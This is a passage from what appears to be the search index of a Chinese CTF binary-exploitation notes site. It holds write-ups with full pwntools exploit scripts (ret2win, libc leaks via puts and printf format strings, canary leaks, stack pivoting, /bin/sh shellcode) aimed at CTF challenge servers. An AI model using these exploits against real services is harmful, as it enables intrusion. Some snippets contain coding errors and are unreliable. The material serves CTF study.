<li>\u901a\u8fc7\u53cd\u6c47\u7f16\u5de5\u5177\uff08\u5982 <code>gdb</code>\uff09\u8c03\u8bd5 shellcode\uff0c\u786e\u4fdd\u5b83\u80fd\u88ab\u6b63\u786e\u6267\u884c</li> <li>\u6839\u636e\u76ee\u6807\u7cfb\u7edf\u7684\u67b6\u6784\u548c\u64cd\u4f5c\u7cfb\u7edf\u7279\u6027\uff0c\u8c03\u6574 shellcode\uff08\u5982 x86 \u548c x86_64 \u67b6\u6784\u7684\u5dee\u5f02\uff09</li> </ul>"},{"location":"Pwn/Chapter3/#shellcode-\u7684\u9632\u5fa1","title":"Shellcode \u7684\u9632\u5fa1","text":"<p>\u9632\u6b62 shellcode \u6267\u884c\u662f\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u548c\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u4e00\u4e2a\u91cd\u8981\u76ee\u6807</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u9632\u5fa1\u63aa\u65bd\uff1a</p> <ul> <li>\u6570\u636e\u6267\u884c\u4fdd\u62a4 (DEP)\uff1a\u4e5f\u79f0\u4e3a\u6267\u884c\u4fdd\u62a4 (NX bit)\uff0c\u9632\u6b62\u6570\u636e\u533a\uff08\u5982\u5806\u6808\uff09\u4e2d\u7684\u6570\u636e\u88ab\u5f53\u4f5c\u4ee3\u7801\u6267\u884c</li> <li>\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316 (ASLR)\uff1a\u4f7f\u5f97\u653b\u51fb\u8005\u65e0\u6cd5\u9884\u6d4b shellcode \u5728\u5185\u5b58\u4e2d\u7684\u786e\u5207\u4f4d\u7f6e</li> <li>\u6808\u6ea2\u51fa\u4fdd\u62a4\uff08\u5982 Stack Canaries\uff09\uff1a\u5728\u6808\u4e0a\u63d2\u5165\u4e00\u4e2a\u201c\u54e8\u5175\u201d\u503c\uff0c\u4ee5\u68c0\u6d4b\u7f13\u51b2\u533a\u6ea2\u51fa\u662f\u5426\u7be1\u6539\u4e86\u8fd4\u56de\u5730\u5740</li> <li>\u63a7\u5236\u6d41\u5b8c\u6574\u6027 (CFI)\uff1a\u9632\u6b62\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u88ab\u653b\u51fb\u8005\u4fee\u6539\uff0c\u963b\u6b62\u8df3\u8f6c\u5230\u653b\u51fb\u8005\u6ce8\u5165\u7684\u4ee3\u7801</li> </ul>"},{"location":"Pwn/Chapter3/#shellcode-\u793a\u4f8b-linux-x86","title":"Shellcode \u793a\u4f8b  (Linux x86)","text":"<p>\u4ee5\u4e0b\u662f\u4e00\u4e2a\u7b80\u5355\u7684 Linux x86 shellcode \u793a\u4f8b\uff0c\u5b83\u5c06\u6267\u884c <code>/bin/sh</code>\uff1a</p> <pre><code>section .data\n    shell db '/bin/sh', 0\n\nsection .text\n    global _start\n\n_start:\n    ; syscall execve\n    xor eax, eax        ; eax = 0\n    push eax            ; null terminator for the string\n    push shell          ; push the address of the string \"/bin/sh\"\n    mov ebx, esp        ; ebx points to the string\n    xor ecx, ecx        ; ecx = 0 (no arguments)\n    xor edx, edx        ; edx = 0 (no environment)\n    mov al, 11          ; execve syscall number (11)\n    int 0x80            ; call kernel\n</code></pre> <p>\u8fd9\u4e2a shellcode \u4f1a\u6267\u884c <code>execve(\"/bin/sh\")</code>\uff0c\u542f\u52a8\u4e00\u4e2a\u65b0\u7684 shell</p>"},{"location":"Pwn/Chapter3/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>Shellcode \u662f pwn \u653b\u51fb\u4e2d\u81f3\u5173\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u7cbe\u5fc3\u8bbe\u8ba1 shellcode \u6765\u7ed5\u8fc7\u9632\u62a4\u673a\u5236\u5e76\u83b7\u5f97\u76ee\u6807\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u9650</p> <p>\u7406\u89e3\u5982\u4f55\u7f16\u5199\u548c\u6267\u884c shellcode \u662f\u6210\u4e3a\u9ad8\u7ea7\u653b\u51fb\u8005\uff08\u5982 CTF \u9009\u624b\uff09\u7684\u5173\u952e\u6280\u80fd\u4e4b\u4e00</p> <p>\u5728\u73b0\u4ee3\u73af\u5883\u4e2d\uff0c\u9632\u5fa1\u673a\u5236\u4e0d\u65ad\u8fdb\u6b65\uff0cshellcode \u4e5f\u5728\u4e0d\u65ad\u6f14\u5316\u4ee5\u7ed5\u8fc7\u8fd9\u4e9b\u9632\u5fa1</p>"},{"location":"Pwn/Chapter3/3-1/","title":"Abs \u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","text":""},{"location":"Pwn/Chapter3/3-1/#abs-\u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","title":"Abs \u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","text":"<p>\u6587\u4ef6\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\n#define BUF_SIZE 0x100\n\n/* Call this function! */\nvoid win() {\n  char *args[] = {\"/bin/cat\", \"/flag.txt\", NULL};\n  execve(args[0], args, NULL);\n  exit(1);\n}\n\nint get_size() {\n  // Input size\n  int size = 0;\n  scanf(\"%d%*c\", &amp;size);\n\n  // Validate size\n  if ((size = abs(size)) &gt; BUF_SIZE) {\n    puts(\"[-] Invalid size\");\n    exit(1);\n  }\n\n  return size;\n}\n\nvoid get_data(char *buf, unsigned size) {\n  unsigned i;\n  char c;\n\n  // Input data until newline\n  for (i = 0; i &lt; size; i++) {\n    if (fread(&amp;c, 1, 1, stdin) != 1) break;\n    if (c == '\\n') break;\n    buf[i] = c;\n  }\n  buf[i] = '\\0';\n}\n\nvoid echo() {\n  int size;\n  char buf[BUF_SIZE];\n\n  // Input size\n  printf(\"Size: \");\n  size = get_size();\n\n  // Input data\n  printf(\"Data: \");\n  get_data(buf, size);\n\n  // Show data\n  printf(\"Received: %s\\n\", buf);\n}\n\nint main() {\n  setbuf(stdin, NULL);\n  setbuf(stdout, NULL);\n  echo();\n  return 0;\n}\n</code></pre> <p>\u6211\u4eec\u7684\u76ee\u7684\u662f\u8c03\u7528 win() \u51fd\u6570\u62ff\u5230 flag</p> <p>\u91cd\u70b9\u662f get_size() \u51fd\u6570\uff0c\u5b83\u5141\u8bb8\u6211\u4eec\u6307\u5b9a size \u5927\u5c0f\u4f46\u662f\u88ab abs() \u51fd\u6570\u9650\u5236\u5728\u4e86\u6700\u591a 256</p> <p>\u5c06 abs \u51fd\u6570\u5e94\u7528\u4e8e INT_MIN \u53ef\u80fd\u4f1a\u5bfc\u81f4\u6ea2\u51fa</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e 32 \u4f4d int \u7c7b\u578b\uff0cINT_MIN \u4e3a -2147483648\u3002\u5b83\u7684\u7edd\u5bf9\u503c\u53d8\u6210 2147483648\uff0c\u4f46\u662f\u7531\u4e8e int \u7684\u6700\u5927\u503c\u662f 2147483647\uff0c\u56e0\u6b64\u65e0\u6cd5\u8868\u793a\u5e76\u53d1\u751f\u6ea2\u51fa</p> <p>get_data \u5c06 size \u7684\u503c\u7ed9\u4e86 buf\uff0c\u53bb\u770b\u770b buf \u7684\u6808</p> <p></p> <p>win \u51fd\u6570\u8c03\u7528\u540e\u9700\u8981\u6253\u5370\u51fa flag</p> <p></p> <p>\u603b\u5171\u76f8\u5dee 280 \u4e2a\u5b57\u8282\u5230\u7f13\u51b2\u533a\uff0c\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('34.170.146.252', 59637)\n\np.sendlineafter(b\"Size: \", b\"-2147483648\")\np.sendlineafter(b\"Data: \", b'A' * 280 + p64(0x04011F6))\nprint(p.recvall())\n</code></pre> <p>\u6210\u529f\u89e3\u51fa\uff01</p> <p></p>"},{"location":"Pwn/Chapter3/3-2/","title":"Unsigned int \u65e0\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","text":""},{"location":"Pwn/Chapter3/3-2/#unsigned-int-\u65e0\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","title":"Unsigned int \u65e0\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","text":"<p>\u89c2\u5bdf\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u539f\u672c\u6211\u4eec int \u7c7b\u578b nbytes \u6700\u540e\u53c8\u8f6c\u4e3a\u4e86 unsigned int</p> <p></p> <p>\u672c\u5730\u8c03\u8bd5\u4e00\u4e2a\u7b80\u6613\u7a0b\u5e8f</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8f6c\u6362\u540e\u7684\u6570\u503c\u975e\u5e38\u5927\uff0c\u660e\u663e\u7ec4\u6210\u6ea2\u51fa</p> <p></p> <p>\u67e5\u770b\u7f13\u51b2\u533a\u5927\u5c0f</p> <p></p> <p>\u7ed9\u51fa\u4e86\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',27053)\n\np.recvuntil('name:\\n')\np.sendline(str(-2))\np.recvuntil('name?\\n')\n\npayload = b'a' * 0x18 + p64(0x400726)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/","title":"Index","text":""},{"location":"Pwn/Chapter4/#albert-gonzalez","title":"Albert Gonzalez","text":"<p>\u5728\u4e0e\u7279\u52e4\u5c40\u5408\u4f5c\u7684\u540c\u65f6\uff0c\u636e\u79f0\u4ed6\u7b56\u5212\u4e86\u5bf9 TJX \u516c\u53f8\u7684\u9ed1\u5ba2\u653b\u51fb\uff0c\u5728\u622a\u81f3 2007 \u5e74\u7684 18 \u4e2a\u6708\u5185\uff0c4560 \u4e07\u5f20\u4fe1\u7528\u5361\u548c\u501f\u8bb0\u5361\u53f7\u88ab\u76d7</p> <p>2008 \u5e74 5 \u6708 7 \u65e5\uff0c\u5188\u8428\u96f7\u65af\u56e0\u4ece\u7ebd\u7ea6\u5dde Islandia \u4e00\u5bb6\u9910\u5385\u7684\u9500\u552e\u70b9\u4fb5\u5165Dave &amp; Buster \u516c\u53f8\u7f51\u7edc\u800c\u88ab\u6355\u3002\u8be5\u4e8b\u4ef6\u53d1\u751f\u5728 2007 \u5e74 9 \u6708\u3002\u7ea6\u6709 5000 \u5f20\u5361\u53f7\u88ab\u76d7\u3002\u636e\u62a5\u544a\uff0c\u5176\u4e2d 675 \u5f20\u5361\u88ab\u76d7\u4ea4\u6613\u603b\u989d\u8fbe 600,000 \u7f8e\u5143</p> <p></p>"},{"location":"Pwn/Chapter4/4-1/","title":"Puts \u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-1/#puts-\u6cc4\u9732-libc","title":"Puts \u6cc4\u9732 Libc","text":"<p>gets \u660e\u663e\u5b58\u5728\u6ea2\u51fa\uff0c\u4f46\u662f\u6ca1\u6709\u7ed9\u51fa\u540e\u95e8\u51fd\u6570\u53ca\u53ef\u5229\u7528\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u5148\u6cc4\u9732 libc \u57fa\u5740</p> <p>\u5de6\u8fb9 plt \u8868\u4e2d\u6709 puts \u51fd\u6570\uff0c\u53ef\u901a\u8fc7\u8c03\u7528 puts \u51fd\u6570\u6253\u5370 puts \u5728 got \u8868\u4e2d\u7684\u5730\u5740\u6765\u8ba1\u7b97 libc \u5730\u5740</p> <p></p> <p>\u7f13\u51b2\u533a\u7684\u5783\u573e\u6570\u636e\u662f 40 \u5b57\u8282</p> <p></p> <p>\u5148\u4f7f\u7528\u5de5\u5177\u83b7\u53d6 pop rdi \u53ca ret \u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',28632)\n\nelf = ELF('./ciscn_2019_n_5')\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n\nmain = 0x400636\npop_rdi = 0x400713\nret = 0x4004c9\n\np.recvuntil('name\\n')\np.sendline('aaa')\np.recvuntil('me?\\n')\n\npayload = b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\np.sendline(payload)\n\nputs_add = u64(p.recv(6).ljust(8,b'\\x00'))\n\n# \u504f\u79fb\u7f51\u4e0a\u627e\u7684\nsystem = puts_add - 0x31580\nbinsh = puts_add + 0x1334da\n\np.recvuntil('name\\n')\np.sendline('aaa')\np.recvuntil('me?\\n')\n\npayload = b'a'*0x28 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/4-10/","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-10/#printf-\u6307\u5b9a\u5730\u5740\u6cc4\u9732-libc","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Libc","text":"<p>\u5728\u7b2c 25 \u884c\u660e\u663e\u5b58\u5728\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</p> <p></p> <p>\u9996\u5148\u8c03\u8bd5\u7a0b\u5e8f\u627e\u627e\u504f\u79fb</p> <p>\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u662f 8\uff0c\u4f46\u662f\u6ca1\u6709\u8865\u5168</p> <p></p> <p>\u524d\u9762\u8fd8\u8981\u52a0\u4e2a\u5b57\u7b26\u8865\u5168\u624d\u662f</p> <p></p> <p>\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732 libc \u7248\u672c</p> <pre><code># 'A'  \u662f\u7528\u6765\u8865\u4f4d\u7684\uff0c\u8fd9\u6837\u540e\u9762\u7684 printf \u51fd\u6570\u7684 got \u8868\u5730\u5740\u5c31\u4f1a\u5728\u6808\u4e0a\u76f8\u5bf9\u8ddd\u79bb\u4e3a 8 \u7684\u4f4d\u7f6e\n# %8$s  \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 %8$s \u53bb\u6cc4\u9732\u51fa\u6808\u4e0a\u76f8\u5bf9\u8ddd\u79bb\u4e3a 8 \u7684\u5730\u5740\u4e0a\u7684\u503c\n# 'B'  \u76f8\u5f53\u4e8e\u6807\u8bb0\u4f4d\uff0c\u4e0b\u9762\u5728\u63a5\u6536\u6570\u636e\u7684\u65f6\u5019\uff0c\u63a5\u6536\u5230\u5b57\u7b26 'B',\u540e\u9762\u8ddf\u7740\u7684\u5c31\u662f\u6211\u4eec\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\u5730\u5740\npayload = b'A' + p32(printf_got)+ b'B' + b'%8$s'\n</code></pre> <p>\u5b8c\u6574 payload \u5982\u4e0b\uff08\u540e\u7eed getshell \u90e8\u5206\u53c2\u8003 2.4\uff09</p> <pre><code>payload = b'A' + p32(printf_got)+ b'B' + b'%8$s'\n\np.sendafter(\"Please tell me:\", payload)\n\np.recvuntil('B')\nprintf_addr = u32(r.recv(4))\n\nlibc = LibcSearcher('printf', printf_addr)\nlibc_base = printf_addr - libc.dump('printf') \nsystem = libc_base + libc.dump('system')\n</code></pre>"},{"location":"Pwn/Chapter4/4-11/","title":"Puts \u6cc4\u9732 Canary","text":""},{"location":"Pwn/Chapter4/4-11/#puts-\u6cc4\u9732-canary","title":"Puts \u6cc4\u9732 Canary","text":"<p>\u5148 run \u4e00\u4e0b</p> <p></p> <p>\u4e3b\u8981\u529f\u80fd\u70b9\u662f 1 \u548c 2\uff0c\u5176 1 \u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e</p> <p></p> <p>\u7531\u4e8e\u5b58\u5728 canary\uff0c\u6211\u4eec\u9996\u5148\u8981\u60f3\u529e\u6cd5\u6cc4\u9732\u51fa\u5b83\u7684\u503c\u6765\u7ed5\u8fc7 canary \u4fdd\u62a4</p> <p>canary \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f '\\x00'\uff0c\u53c8\u56e0\u4e3a\u662f\u5c0f\u7aef\u5b58\u50a8\uff0c\u6240\u4ee5\u5728\u5185\u5b58\u4e2d\u4f4d\u7f6e\u662f\u5728\u5f00\u5934\u7684</p> <pre><code>\u5185\u5b58\u5730\u5740\u4f4e -&gt; \u9ad8\n00 CC BB AA 78 56 34 12\n</code></pre> <p>\u60f3\u7528 put \u51fd\u6570\u6cc4\u9732 canary\uff0c\u4f46 puts \u51fd\u6570\u5728\u8f93\u51fa\u7684\u65f6\u5019\u662f\u9047\u5230 '\\x00' \u4f1a\u7ed3\u675f\uff0c\u6240\u4ee5\u5199\u5165 a \u7684\u65f6\u5019\u7528 '/n' \u8986\u76d6\u6389</p> <p>\u6b63\u597d sendline \u4e4b\u540e\u4f1a\u53d1\u9001\u4e00\u4e2a '/n' \u4f1a\u8986\u76d6\u6389 '\\x00'</p> <p>\u5728 pwntools \u4e2d\uff0csendline \u548c send \u90fd\u662f\u53d1\u9001\u6570\u636e\uff0c\u4f46\u662f sendline \u662f\u53d1\u9001\u4e00\u884c\u6570\u636e\uff0c\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f sendline \u4f1a\u5728\u53d1\u9001\u7684\u6570\u636e\u672b\u5c3e\u52a0\u4e00\u4e2a\u56de\u8f66</p> <pre><code>r.sendlineafter('&gt;&gt;', 1)\n\npayload = b'a' + (0x90 - 0x8)\n\nr.sendline(payload)\nr.sendlineafter('&gt;&gt;', 2)\nr.recvuntil('a\\n')\n\ncanary = u64(r.recv(7).rjust(8, b'\\x00'))\n</code></pre> <p>\u56e0\u4e3a\u662f 64 \u4f4d\u7684\uff0c\u540e\u7eed\u518d\u627e\u4e0b <code>pop rdi</code></p> <p></p> <p>\u62ff\u5230 canary \u540e\u518d\u6cc4\u9732 libc</p> <pre><code>payload += canary + b'a' * 0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\n\nr.sendafter('&gt;&gt;', 1)\nr.sendline(payload)\nr.sendafter('&gt;&gt;', 3)\nr.recv()\n\nputs_addr = u64(r.recv(6).ljust(8, b'\\x00'))\n\nlibc = LibSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc.dump('system') + libc_base\nbin_addr = libc.dump('str_bin_sh') + libc_base\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\n# r = remote('node5.buuoj.cn',29236)\nr = process('./babystack')\n\npop_rdi = 0x0000000000400a93\nelf = ELF('./babystack')\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = 0x400908\n\npayload = b'a' * (0x90 - 0x8)\n\nr.sendlineafter('&gt;&gt;','1')\nr.sendline(payload)\nr.sendlineafter('&gt;&gt;','2')\nr.recvuntil('a\\n')\n\ncanary = u64(r.recv(7).rjust(8,b'\\x00'))\n\npayload += p64(canary)+ b'b' * 0x8\npayload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\n\nr.sendlineafter('&gt;&gt;','1')\nr.sendline(payload)\nr.sendlineafter('&gt;&gt;','3')\nr.recv()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\n\nlibc = LibcSearcher('puts',puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbin_addr = libc.dump('str_bin_sh') + libc_base\n\npayload = b'a'*(0x90-0x8) + p64(canary) + b'b'*0x8\npayload += p64(pop_rdi) + p64(bin_addr) + p64(system_addr)\n\nr.sendlineafter('&gt;&gt;','1')\nr.sendline(payload)\nr.sendlineafter('&gt;&gt;','3')\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-12/","title":"ECX \u5bc4\u5b58\u5668\u6cc4\u9732\u6808\u521d\u59cb\u5730\u5740","text":""},{"location":"Pwn/Chapter4/4-12/#ecx-\u5bc4\u5b58\u5668\u6cc4\u9732\u6808\u521d\u59cb\u5730\u5740","title":"ECX \u5bc4\u5b58\u5668\u6cc4\u9732\u6808\u521d\u59cb\u5730\u5740","text":"<p>\u6ca1\u6cd5\u53cd\u7f16\u8bd1\u4e3a\u4f2a\u4ee3\u7801</p> <p></p> <p>\u4e00\u5f00\u59cb\u8c03\u7528 write \u51fd\u6570\u8f93\u51fa\u4e86 let\u2019s start the ctf</p> <p>4 \u662fwrite\u51fd\u6570\u7684\u8c03\u7528\u53f7\uff0c\u4e4b\u540e\u7684\u8c03\u7528\u53f7\u662f 3\uff0c\u8c03\u7528\u4e86 read \u51fd\u6570</p> <p>\u6211\u4eec\u77e5\u9053 dl \u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u63a7\u5236\u8f93\u5165\u5b57\u7b26\u7684\u591a\u5c11\u7684\uff0c\u4e5f\u5c31\u662f\u6240\u6211\u4eec\u53ef\u4ee5\u8f93\u5165 0x3c \u4e2a\u5b57\u7b26</p> <pre><code>write(1\uff0cbuf\uff0c0x14)\nread(0\uff0cbuf\uff0c0x3C)\n</code></pre> <p>\u901a\u8fc7\u6700\u540e\u7684 add esp,14h \u6211\u4eec\u53ef\u4ee5\u77e5\u9053 esp \u8ddd\u79bb ret \u7684\u5730\u5740 0x14 \u4e2a\u5b57\u8282\uff08\u5185\u5e73\u6808\uff09</p> <p></p> <p>\u4e5f\u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684\u53c2\u6570 buf \u7684\u5927\u5c0f\u53ea\u6709 0x14\uff0c\u4f46\u662f\u6211\u4eec\u8bfb\u5165\u4e86 0x3c\uff0c\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e</p> <p><code>0x8048087</code> \u4e4b\u524d\u6808\u4e0a\u538b\u5165\u4e86 7 \u4e2a\u6570\u636e\uff0c\u4e4b\u540e read()\u3001write() \u51fd\u6570\u8c03\u7528\u5b8c\u540e esp \u59cb\u7ec8\u6ca1\u6709\u53d8\u5316\uff0c\u76f4\u5230\u51fa\u73b0\u4e86 <code>add esp,0x14</code></p> <p>\u8fd9\u4f7f\u5f97 esp \u6b64\u65f6\u6307\u5411\u7b2c\u4e8c\u4e2a\u538b\u5165\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f <code>offset _exit</code> \u7684\u5730\u5740</p> <p></p> <p>\u5176\u4e0a\u9762\u5c31\u662f\u7b2c\u4e00\u6b21\u538b\u5165\u7684\u6570\u636e\uff08\u6808\u7684\u5730\u5740\uff0c\u5c31\u662f\u5373\u5c06\u88ab\u6cc4\u9732\u7684\u6808\u7684\u5730\u5740\uff09</p> <p></p> <p>\u5982\u4e0a\uff0c\u6808\u7b2c\u4e8c\u4e2a\u5730\u65b9\u5b58\u7684\u5c31\u662f\u7b2c\u4e00\u4e2a\u88ab\u538b\u5165\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u5176\u4e0b\u9762\u7684\u6808\u7684\u5730\u5740</p> <p>\u7531\u4e8e\u4f7f\u7528\u7684\u5185\u5e73\u6808\uff0c\u6ca1\u6709 ebp\uff0c\u8986\u76d6\u5b8c buf \u540e\u5c31\u662f ret\uff0c\u5176\u5b9e\u770b\u4e0a\u65b9\u7684\u6c47\u7f16\u5c31\u77e5\u9053\u4e86</p> <p>\u8fd9\u53e5 payload \u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u8f6c\u5230\u4e86\u53bb\u6267\u884c write \u51fd\u6570</p> <p>\u6240\u4ee5\u5f53 paylaod \u53d1\u9001\u65f6\uff0c\u8fd4\u56de <code>0x08048087: mov ecx, esp ; addr</code> \u5230\u8fd9\u91cc\u6267\u884c</p> <p>\u4f7f ecx \u6307\u5411\u6808\u9876\uff0c\u6b64\u65f6\u6808\u9876\u5c31\u662f\u7b2c\u4e00\u4e2a\u88ab\u538b\u5165\u7684\u6570\u636e\uff0c\u5b58\u7684\u6b63\u662f\u6808\u7684\u521d\u59cb\u5730\u5740\uff0c\u53ef\u4ee5\u88ab\u6cc4\u9732</p> <pre><code>mov_ecx_esp = 0x08048087\n\npayload = b'a' * 0x14 + mov_ecx_esp\n\np.sendafter(':', payload)\n</code></pre> <p></p> <p>\u56e0\u4e3a\u7b2c\u4e8c\u6b21\u6267\u884c\u5b8c read \u4e4b\u540e\u6267\u884c\u4e86 <code>add esp,14h</code></p> <p>\u6b64\u65f6 esp \u6307\u5411\u7684\u5c31\u662f\u5373\u5c06\u6267\u884c\u7684 shellcode \u7684\u5730\u5740\uff0c\u800c shellcode \u7684\u5730\u5740\u6b63\u662f\u6cc4\u9732\u7684 <code>stack_addr + 0x14</code></p> <pre><code>shellcode = '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f6e\npush 0x69622f2f\nmov ebx,esp\nmov al,0xb\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = b'A' * 0x14 + p32(stack_addr + 0x14) + shellcode\n\np.send(payload)\np.interactive()\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\n\np = process('./start')\n#p = remote('node5.buuoj.cn',29955)\n\npayload = b'A' * 0x14 + p32(0x8048087)\n\np.sendafter(\"Let's start the CTF:\",payload)\n\nstack_addr = u32(p.recv(4))\n\nprint(hex(stack_addr))\ngdb.attach(p)\n\nshellcode = '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f6e\npush 0x69622f2f\nmov ebx,esp\nmov al,0xb\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = b'A' * 0x14 + p32(stack_addr + 0x14) + shellcode\n\np.send(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-13/","title":"Puts \u6cc4\u9732 Libc \u7ed3\u5408 64 \u4f4d\u6808\u8fc1\u79fb","text":""},{"location":"Pwn/Chapter4/4-13/#puts-\u6cc4\u9732-libc-\u7ed3\u5408-64-\u4f4d\u6808\u8fc1\u79fb","title":"Puts \u6cc4\u9732 Libc \u7ed3\u5408 64 \u4f4d\u6808\u8fc1\u79fb","text":"<p>\u53cd\u7f16\u8bd1\u53ea\u591f\u6ea2\u51fa 0x10\uff0c\u7b2c\u4e8c\u4e2a read \u653e\u5230\u4e86 bss \u6bb5</p> <p></p> <p>\u9996\u5148\u5229\u7528 pit \u8868\u4e2d\u7684 puts \u51fd\u6570\u6cc4\u9732 libc\uff0c\u5f97\u5148\u627e <code>pop rdi</code> \u6307\u4ee4</p> <p></p> <p>\u5176\u6b21\u6808\u8fc1\u79fb\u9700\u8981 leave \u6307\u4ee4</p> <p></p> <p>\u5148\u6784\u9020 payload \u8fc1\u79fb\u6808\u5230 bss \u6bb5</p> <pre><code>r.recvuntil('u want')\n\npayload = b'a' * 0x60 + p64(bank_addr) + p64(leave)\n\nr.send(payload)\n</code></pre> <p>\u7b2c\u4e00\u6b21\u6ea2\u51fa</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u5c06\u6808\u8fc1\u79fb\u5230\u53d8\u91cf bank \u7684\u5f00\u5934\uff0c\u56e0\u4e3a\u540e\u9762\u8fd8\u9700\u8981\u8c03\u7528 puts \u7b49\u51fd\u6570\uff0c\u5f80\u4e0a\u53ef\u80fd\u4f1a\u8986\u76d6\u67d0\u4e9b\u91cd\u8981\u6570\u636e\uff0c\u56e0\u6b64\u8fc1\u79fb\u7684\u5730\u5740\u5e94\u8be5\u5c3d\u91cf\u9760\u540e</p> <p>bank \u7684\u5730\u5740\u8ddd\u79bb got \u8868\u5f88\u8fd1\uff0c\u53ea\u9694\u7740 0x30 \u7684\u8ddd\u79bb\uff0c\u800c\u8c03\u7528 puts \u5f88\u5403\u6808\u7a7a\u95f4\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u505a\u6808\u8fc1\u79fb\u7684\u65f6\u5019\u8981\u628a\u5730\u5740\u76f8\u5bf9\u7684\u62ac\u9ad8\u4e9b</p> <p></p> <p>\u518d\u627e\u627e ret \u6307\u4ee4\uff0c\u76f8\u5f53\u4e8e</p> <pre><code>pop eip # \u7ed9 eip \u8d4b\u503c\n</code></pre> <p></p> <p>\u4e4b\u540e\u518d\u5728 bss \u6bb5\u4e2d\u6784\u9020\u6cc4\u9732 libc \u7684 payload</p> <p>\uff08\u53ea\u8981 p64(ret) * num \u4e2d 28 &gt;= num &gt;= 20 \u5373\u53ef\uff09</p> <pre><code>r.recvuntil('now!')\n\npayload = p64(ret) * 21 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n</code></pre> <p>\u4e4b\u540e\u5c31\u662f libc \u57fa\u5740\u4e86</p> <pre><code>libc = LibcSearcher('puts', pus_addr)\nlibc_base = pus_addr - libc.dump('puts')\n</code></pre> <p>\u4f46\u662f\u8fd9\u9898\u4e0d\u80fd ROP\uff0c\u53ea\u80fd one_gadget\uff08\u53ef\u80fd\u662f\u7a7a\u95f4\u4e0d\u591f\uff09</p> <p></p> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node5.buuoj.cn',26424)\n#r = process('./gyctf_2020_borrowstack')\n\nelf = ELF('./gyctf_2020_borrowstack')\nbank_addr = 0x0601080\nleave = 0x400699\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x400703\nmain = 0x0400626\nret = 0x4004c9\n\nr.recvuntil('u want')\n\npayload = b'a' * 0x60 + 